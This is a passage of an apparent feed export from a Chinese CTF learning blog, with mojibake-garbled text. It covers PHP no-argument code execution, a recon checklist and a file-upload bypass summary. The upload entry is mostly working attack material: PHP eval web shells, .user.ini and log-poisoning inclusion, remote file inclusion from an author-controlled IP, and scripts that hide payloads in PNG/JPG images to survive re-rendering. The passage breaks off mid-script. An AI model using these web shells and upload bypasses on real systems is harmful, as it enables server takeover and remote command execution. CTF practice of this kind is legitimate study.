class="line">           <span class="keyword">if</span> (!preg_match(<span class="string">&#x27;/et|na|info|dec|bin|hex|oct|pi|log/i&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&#x27;exp&#x27;</span>])) &#123; <span class="comment">#è¿‡æ»¤å‡½æ•°å…³é”®å­—</span></span><br></pre></td></tr></table></figure><p>ç„¶åå¼€å§‹æ„é€ </p><pre><code>show_source(next(array_reverse(scandir(current(localeconv())))));</code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;GXYCTF2019-BabyUpload&quot;&gt;&lt;a href=&quot;#GXYCTF2019-BabyUpload&quot; class=&quot;headerlink&quot; title=&quot;[GXYCTF2019]BabyUpload&quot;&gt;&lt;/a&gt;[GXYCTF2019]BabyUpload</summary>
      
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>jwtæ€»ç»“</title>
    <link href="http://haorical.xyz/posts/e8e4811b/"/>
    <id>http://haorical.xyz/posts/e8e4811b/</id>
    <published>2021-11-17T12:54:53.000Z</published>
    <updated>2021-11-18T15:20:40.713Z</updated>
    
    
    
    
    <category term="ctfæ¯æ—¥ä¸€é¢˜" scheme="http://haorical.xyz/categories/ctf%E6%AF%8F%E6%97%A5%E4%B8%80%E9%A2%98/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ä¿¡æ¯æœé›†</title>
    <link href="http://haorical.xyz/posts/b21d488/"/>
    <id>http://haorical.xyz/posts/b21d488/</id>
    <published>2021-11-17T11:35:13.000Z</published>
    <updated>2021-11-17T12:52:11.374Z</updated>
    
    <content type="html"><![CDATA[<h2 id="phps"><a href="#phps" class="headerlink" title="phps"></a>phps</h2><h2 id="git"><a href="#git" class="headerlink" title=".git/"></a>.git/</h2><h2 id="svn"><a href="#svn" class="headerlink" title=".svn/"></a>.svn/</h2><h2 id="swp"><a href="#swp" class="headerlink" title=".swp"></a>.swp</h2><p>ls -al</p><h2 id="http-dbcha-com"><a href="#http-dbcha-com" class="headerlink" title="http://dbcha.com/"></a><a href="http://dbcha.com/">http://dbcha.com/</a></h2><h2 id="adminå¯†ç "><a href="#adminå¯†ç " class="headerlink" title="/adminå¯†ç "></a>/adminå¯†ç </h2><h2 id="editor"><a href="#editor" class="headerlink" title="editor"></a>editor</h2><h2 id="tz-phpæ¢é’ˆ"><a href="#tz-phpæ¢é’ˆ" class="headerlink" title="tz.phpæ¢é’ˆ"></a>tz.phpæ¢é’ˆ</h2><h2 id="cdn-ç»•è¿‡"><a href="#cdn-ç»•è¿‡" class="headerlink" title="cdn ç»•è¿‡"></a>cdn ç»•è¿‡</h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;phps&quot;&gt;&lt;a href=&quot;#phps&quot; class=&quot;headerlink&quot; title=&quot;phps&quot;&gt;&lt;/a&gt;phps&lt;/h2&gt;&lt;h2 id=&quot;git&quot;&gt;&lt;a href=&quot;#git&quot; class=&quot;headerlink&quot; title=&quot;.git/&quot;&gt;&lt;/a&gt;</summary>
      
    
    
    
    <category term="ctfå­¦ä¹ " scheme="http://haorical.xyz/categories/ctf%E5%AD%A6%E4%B9%A0/"/>
    
    
    <category term="ctf" scheme="http://haorical.xyz/tags/ctf/"/>
    
    <category term="web" scheme="http://haorical.xyz/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>ååºåˆ—åŒ–æ€»ç»“</title>
    <link href="http://haorical.xyz/posts/1e128b6c/"/>
    <id>http://haorical.xyz/posts/1e128b6c/</id>
    <published>2021-11-15T13:18:08.000Z</published>
    <updated>2021-11-17T12:52:11.376Z</updated>
    
    <content type="html"><![CDATA[<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;&quot;&gt;&lt;a href=&quot;#&quot; class=&quot;headerlink&quot; title=&quot;&quot;&gt;&lt;/a&gt;&lt;/h2&gt;</summary>
      
    
    
    
    
  </entry>
  
  <entry>
    <title>æ–‡ä»¶ä¸Šä¼ æ€»ç»“</title>
    <link href="http://haorical.xyz/posts/ea42f6a6/"/>
    <id>http://haorical.xyz/posts/ea42f6a6/</id>
    <published>2021-11-10T15:14:50.000Z</published>
    <updated>2021-11-15T09:46:43.179Z</updated>
    
    <content type="html"><![CDATA[<h2 id="åŸºæœ¬æ€è·¯"><a href="#åŸºæœ¬æ€è·¯" class="headerlink" title="åŸºæœ¬æ€è·¯"></a>åŸºæœ¬æ€è·¯</h2><ol><li>ç»•è¿‡å„ç§å‰ç«¯è¿‡æ»¤</li><li>ä¸Šä¼ .user.ini/.htaccess</li><li>ä¸Šä¼ åŒ…å«ä¸€å¥è¯æ–‡ä»¶/æ—¥å¿—åŒ…å«/è¿œç¨‹æ–‡ä»¶åŒ…å«</li><li>ç»•è¿‡å…³é”®å­—è¿‡æ»¤</li><li>ç»•è¿‡ç‰¹æ®Šç±»å‹å¦‚äºŒæ¬¡æ¸²æŸ“/httpd</li><li>sessionç«äº‰</li></ol><h2 id="å‰ç«¯è¿‡æ»¤"><a href="#å‰ç«¯è¿‡æ»¤" class="headerlink" title="å‰ç«¯è¿‡æ»¤"></a>å‰ç«¯è¿‡æ»¤</h2><p>ç›´æ¥æ”¹å‰ç«¯ä»£ç å³å¯</p><h2 id="ç®€å•åç«¯è¿‡æ»¤"><a href="#ç®€å•åç«¯è¿‡æ»¤" class="headerlink" title="ç®€å•åç«¯è¿‡æ»¤"></a>ç®€å•åç«¯è¿‡æ»¤</h2><p>content-type æ”¹ä¸º image/png(jpg/gif)</p><p>filename æ”¹åç¼€</p><p>æ”¹æ–‡ä»¶å¤´ä¸ºgifå¤´</p><pre><code>GIF89a</code></pre><p>æ”¹æ–‡ä»¶å¤´ä¸ºpngå¤´ï¼Œç›´æ¥åœ¨hexæ”¹</p><pre><code>89504e470d0a</code></pre><p>00æˆªæ–­</p><p>test.php1png</p><p>hexä¸­å°†31æ”¹ä¸º00</p><p>php3 php4æµ‹è¯•</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="user-iniä¸Šä¼ "><a href="#user-iniä¸Šä¼ " class="headerlink" title=".user.iniä¸Šä¼ "></a>.user.iniä¸Šä¼ </h2><p>upload/ä¸‹å­˜åœ¨index.php</p><p>å…ˆä¸Šä¼ .user.iniï¼Œå†ä¸Šä¼ 1.txtæˆ–å…¶ä»–æ”¯æŒä¸Šä¼ ç±»å‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># .user.ini</span></span><br><span class="line">auto_append_file=<span class="number">1.</span>txt</span><br><span class="line"></span><br><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span> @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h2 id="phpçŸ­æ ‡ç­¾"><a href="#phpçŸ­æ ‡ç­¾" class="headerlink" title="phpçŸ­æ ‡ç­¾"></a>phpçŸ­æ ‡ç­¾</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script language=<span class="string">&quot;php&quot;</span>&gt;@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);&lt;/script&gt;</span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?=</span>@<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);<span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">&lt;% @<span class="keyword">eval</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]); %&gt;</span><br></pre></td></tr></table></figure><h2 id="å…³é”®å­—è¿‡æ»¤"><a href="#å…³é”®å­—è¿‡æ»¤" class="headerlink" title="å…³é”®å­—è¿‡æ»¤"></a>å…³é”®å­—è¿‡æ»¤</h2><p>[]æ›¿æ¢ä¸º{}</p><p>[] {}å…¨è¿‡æ»¤</p><pre><code>&lt;?=@eval(array_pop($_POST));?&gt;</code></pre><p>; å¯ç›´æ¥å»æ‰;</p><p>ç©ºæ ¼è¿‡æ»¤å°†ç©ºæ ¼æ”¹hexä¸º0d</p><p>. è¿‡æ»¤ç”¨è¿œç¨‹æ–‡ä»¶åŒ…å«</p><h2 id="æ—¥å¿—åŒ…å«"><a href="#æ—¥å¿—åŒ…å«" class="headerlink" title="æ—¥å¿—åŒ…å«"></a>æ—¥å¿—åŒ…å«</h2><p>è¿‡æ»¤()<br>.user.ini è‡ªåŠ¨åŒ…å«æ–‡ä»¶å¦‚ä¸‹</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1.txt</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment"># è¿‡æ»¤ log ç”¨ . åˆ†å¼€å³å¯</span></span><br><span class="line"><span class="variable">$a</span>=<span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span></span><br><span class="line"><span class="keyword">include</span> <span class="variable">$a</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line">è‹¥æœ‰è¿‡æ»¤ï¼Œå¯è¿™æ ·å†™</span><br><span class="line"><span class="meta">&lt;?=</span>include1<span class="string">&#x27;/var/l&#x27;</span>.<span class="string">&#x27;og/nginx/access.l&#x27;</span>.<span class="string">&#x27;og&#x27;</span><span class="meta">?&gt;</span></span><br><span class="line">ä¹‹åæ”¹hexå°†<span class="number">1</span>æ”¹ä¸ºod</span><br></pre></td></tr></table></figure><p>åŸŸåä¸‹éšæœºå†™å…¥1.txtï¼Œæ”¹User-Agentä¸º</p><pre><code>&lt;?php @eval($_POST[&#39;cmd&#39;]);?&gt;</code></pre><p>è®¿é—®upload/æµ‹è¯•</p><h2 id="getimagesizeç»•è¿‡"><a href="#getimagesizeç»•è¿‡" class="headerlink" title="getimagesizeç»•è¿‡"></a>getimagesizeç»•è¿‡</h2><p>æ”¹å¤´ä¸ºgifå¤´</p><p>GIF89a</p><h2 id="include-url-è¿œç¨‹æ–‡ä»¶åŒ…å«"><a href="#include-url-è¿œç¨‹æ–‡ä»¶åŒ…å«" class="headerlink" title="include url è¿œç¨‹æ–‡ä»¶åŒ…å«"></a>include url è¿œç¨‹æ–‡ä»¶åŒ…å«</h2><p>ç”¨æˆ‘è‡ªå·±çš„urlï¼Œè¿”å›ä¸€ä¸ªä¸€å¥è¯æœ¨é©¬</p><p><a href="http://47.100.75.233/">http://795102185</a></p><pre><code>&lt;?=include&#39;http://795102185&#39;&gt;</code></pre><p>åŸºæœ¬å¯ä»¥é€šæ€</p><h2 id="äºŒæ¬¡æ¸²æŸ“"><a href="#äºŒæ¬¡æ¸²æŸ“" class="headerlink" title="äºŒæ¬¡æ¸²æŸ“"></a>äºŒæ¬¡æ¸²æŸ“</h2><h3 id="gifæ ¼å¼"><a href="#gifæ ¼å¼" class="headerlink" title="gifæ ¼å¼"></a>gifæ ¼å¼</h3><p>æ¯”è¾ƒç®€å•ï¼Œç›´æ¥å¯¹æ¯”æ²¡æœ‰æ”¹å˜çš„åœ°æ–¹ï¼Œåœ¨é‡Œé¢ç›´æ¥æ’å…¥å³å¯</p><h3 id="pngæ ¼å¼"><a href="#pngæ ¼å¼" class="headerlink" title="pngæ ¼å¼"></a>pngæ ¼å¼</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$p</span> = <span class="keyword">array</span>(<span class="number">0xa3</span>, <span class="number">0x9f</span>, <span class="number">0x67</span>, <span class="number">0xf7</span>, <span class="number">0x0e</span>, <span class="number">0x93</span>, <span class="number">0x1b</span>, <span class="number">0x23</span>,</span><br><span class="line">           <span class="number">0xbe</span>, <span class="number">0x2c</span>, <span class="number">0x8a</span>, <span class="number">0xd0</span>, <span class="number">0x80</span>, <span class="number">0xf9</span>, <span class="number">0xe1</span>, <span class="number">0xae</span>,</span><br><span class="line">           <span class="number">0x22</span>, <span class="number">0xf6</span>, <span class="number">0xd9</span>, <span class="number">0x43</span>, <span class="number">0x5d</span>, <span class="number">0xfb</span>, <span class="number">0xae</span>, <span class="number">0xcc</span>,</span><br><span class="line">           <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0x5a</span>, <span class="number">0x01</span>, <span class="number">0xdc</span>, <span class="number">0xa3</span>, <span class="number">0x9f</span>,</span><br><span class="line">           <span class="number">0x67</span>, <span class="number">0xa5</span>, <span class="number">0xbe</span>, <span class="number">0x5f</span>, <span class="number">0x76</span>, <span class="number">0x74</span>, <span class="number">0x5a</span>, <span class="number">0x4c</span>,</span><br><span class="line">           <span class="number">0xa1</span>, <span class="number">0x3f</span>, <span class="number">0x7a</span>, <span class="number">0xbf</span>, <span class="number">0x30</span>, <span class="number">0x6b</span>, <span class="number">0x88</span>, <span class="number">0x2d</span>,</span><br><span class="line">           <span class="number">0x60</span>, <span class="number">0x65</span>, <span class="number">0x7d</span>, <span class="number">0x52</span>, <span class="number">0x9d</span>, <span class="number">0xad</span>, <span class="number">0x88</span>, <span class="number">0xa1</span>,</span><br><span class="line">           <span class="number">0x66</span>, <span class="number">0x44</span>, <span class="number">0x50</span>, <span class="number">0x33</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="variable">$img</span> = imagecreatetruecolor(<span class="number">32</span>, <span class="number">32</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$y</span> = <span class="number">0</span>; <span class="variable">$y</span> &lt; sizeof(<span class="variable">$p</span>); <span class="variable">$y</span> += <span class="number">3</span>) &#123;</span><br><span class="line">   <span class="variable">$r</span> = <span class="variable">$p</span>[<span class="variable">$y</span>];</span><br><span class="line">   <span class="variable">$g</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">1</span>];</span><br><span class="line">   <span class="variable">$b</span> = <span class="variable">$p</span>[<span class="variable">$y</span>+<span class="number">2</span>];</span><br><span class="line">   <span class="variable">$color</span> = imagecolorallocate(<span class="variable">$img</span>, <span class="variable">$r</span>, <span class="variable">$g</span>, <span class="variable">$b</span>);</span><br><span class="line">   imagesetpixel(<span class="variable">$img</span>, round(<span class="variable">$y</span> / <span class="number">3</span>), <span class="number">0</span>, <span class="variable">$color</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">imagepng(<span class="variable">$img</span>,<span class="string">&#x27;./1.png&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="comment"># ?0=call_user_func post 1=ls</span></span><br><span class="line"><span class="comment"># ?0=system 1=whoami</span></span><br><span class="line"></span><br><span class="line">åˆ©ç”¨æŠ“åŒ…çœ‹ä¿¡æ¯ï¼Œå¯èƒ½ä¸å›æ˜¾</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h3 id="jpgæ ¼å¼"><a href="#jpgæ ¼å¼" class="headerlink" title="jpgæ ¼å¼"></a>jpgæ ¼å¼</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 1=phpinfo();</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="variable">$miniPayload</span> = <span class="string">&quot;&lt;?=phpinfo();?&gt;&quot;</span>;</span><br><span class="line">    <span class="keyword">if</span>(!extension_loaded(<span class="string">&#x27;gd&#x27;</span>) || !function_exists(<span class="string">&#x27;imagecreatefromjpeg&#x27;</span>)) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php-gd is not installed&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$argv</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">&#x27;php jpg_payload.php &lt;jpg_name.jpg&gt;&#x27;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    set_error_handler(<span class="string">&quot;custom_error_handler&quot;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="variable">$pad</span> = <span class="number">0</span>; <span class="variable">$pad</span> &lt; <span class="number">1024</span>; <span class="variable">$pad</span>++) &#123;</span><br><span class="line">        <span class="variable">$nullbytePayloadSize</span> = <span class="variable">$pad</span>;</span><br><span class="line">        <span class="variable">$dis</span> = <span class="keyword">new</span> DataInputStream(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$outStream</span> = file_get_contents(<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">        <span class="variable">$extraBytes</span> = <span class="number">0</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readShort() != <span class="number">0xFFD8</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;Incorrect SOI marker&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof()) &amp;&amp; (<span class="variable">$dis</span>-&gt;readByte() == <span class="number">0xFF</span>)) &#123;</span><br><span class="line">            <span class="variable">$marker</span> = <span class="variable">$dis</span>-&gt;readByte();</span><br><span class="line">            <span class="variable">$size</span> = <span class="variable">$dis</span>-&gt;readShort() - <span class="number">2</span>;</span><br><span class="line">            <span class="variable">$dis</span>-&gt;skip(<span class="variable">$size</span>);</span><br><span class="line">            <span class="keyword">if</span>(<span class="variable">$marker</span> === <span class="number">0xDA</span>) &#123;</span><br><span class="line">                <span class="variable">$startPos</span> = <span class="variable">$dis</span>-&gt;seek();</span><br><span class="line">                <span class="variable">$outStreamTmp</span> = </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                    <span class="variable">$miniPayload</span> . </span><br><span class="line">                    str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>) . </span><br><span class="line">                    substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>);</span><br><span class="line">                checkImage(<span class="string">&#x27;_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStreamTmp</span>, <span class="literal">TRUE</span>);</span><br><span class="line">                <span class="keyword">if</span>(<span class="variable">$extraBytes</span> !== <span class="number">0</span>) &#123;</span><br><span class="line">                    <span class="keyword">while</span>((!<span class="variable">$dis</span>-&gt;eof())) &#123;</span><br><span class="line">                        <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte() === <span class="number">0xFF</span>) &#123;</span><br><span class="line">                            <span class="keyword">if</span>(<span class="variable">$dis</span>-&gt;readByte !== <span class="number">0x00</span>) &#123;</span><br><span class="line">                                <span class="keyword">break</span>;</span><br><span class="line">                            &#125;</span><br><span class="line">                        &#125;</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="variable">$stopPos</span> = <span class="variable">$dis</span>-&gt;seek() - <span class="number">2</span>;</span><br><span class="line">                    <span class="variable">$imageStreamSize</span> = <span class="variable">$stopPos</span> - <span class="variable">$startPos</span>;</span><br><span class="line">                    <span class="variable">$outStream</span> = </span><br><span class="line">                        substr(<span class="variable">$outStream</span>, <span class="number">0</span>, <span class="variable">$startPos</span>) . </span><br><span class="line">                        <span class="variable">$miniPayload</span> . </span><br><span class="line">                        substr(</span><br><span class="line">                            str_repeat(<span class="string">&quot;\0&quot;</span>,<span class="variable">$nullbytePayloadSize</span>).</span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$startPos</span>, <span class="variable">$imageStreamSize</span>),</span><br><span class="line">                            <span class="number">0</span>,</span><br><span class="line">                            <span class="variable">$nullbytePayloadSize</span>+<span class="variable">$imageStreamSize</span>-<span class="variable">$extraBytes</span>) . </span><br><span class="line">                                substr(<span class="variable">$outStream</span>, <span class="variable">$stopPos</span>);</span><br><span class="line">                &#125; <span class="keyword">elseif</span>(<span class="variable">$correctImage</span>) &#123;</span><br><span class="line">                    <span class="variable">$outStream</span> = <span class="variable">$outStreamTmp</span>;</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span>(checkImage(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>], <span class="variable">$outStream</span>)) &#123;</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;Success!&#x27;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    unlink(<span class="string">&#x27;payload_&#x27;</span>.<span class="variable">$argv</span>[<span class="number">1</span>]);</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;Something\&#x27;s wrong&#x27;</span>);</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">checkImage</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$data</span>, <span class="variable">$unlink</span> = <span class="literal">FALSE</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$correctImage</span>;</span><br><span class="line">        file_put_contents(<span class="variable">$filename</span>, <span class="variable">$data</span>);</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">TRUE</span>;</span><br><span class="line">        imagecreatefromjpeg(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$unlink</span>)</span><br><span class="line">            unlink(<span class="variable">$filename</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$correctImage</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">custom_error_handler</span>(<span class="params"><span class="variable">$errno</span>, <span class="variable">$errstr</span>, <span class="variable">$errfile</span>, <span class="variable">$errline</span></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">global</span> <span class="variable">$extraBytes</span>, <span class="variable">$correctImage</span>;</span><br><span class="line">        <span class="variable">$correctImage</span> = <span class="literal">FALSE</span>;</span><br><span class="line">        <span class="keyword">if</span>(preg_match(<span class="string">&#x27;/(\d+) extraneous bytes before marker/&#x27;</span>, <span class="variable">$errstr</span>, <span class="variable">$m</span>)) &#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$m</span>[<span class="number">1</span>])) &#123;</span><br><span class="line">                <span class="variable">$extraBytes</span> = (<span class="keyword">int</span>)<span class="variable">$m</span>[<span class="number">1</span>];</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">DataInputStream</span> </span>&#123;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$binData</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$order</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$size</span>;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$filename</span>, <span class="variable">$order</span> = <span class="literal">false</span>, <span class="variable">$fromString</span> = <span class="literal">false</span></span>) </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;binData = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;order = <span class="variable">$order</span>;</span><br><span class="line">            <span class="keyword">if</span>(!<span class="variable">$fromString</span>) &#123;</span><br><span class="line">                <span class="keyword">if</span>(!file_exists(<span class="variable">$filename</span>) || !is_file(<span class="variable">$filename</span>))</span><br><span class="line">                    <span class="keyword">die</span>(<span class="string">&#x27;File not exists [&#x27;</span>.<span class="variable">$filename</span>.<span class="string">&#x27;]&#x27;</span>);</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = file_get_contents(<span class="variable">$filename</span>);</span><br><span class="line">            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="keyword">$this</span>-&gt;binData = <span class="variable">$filename</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;size = 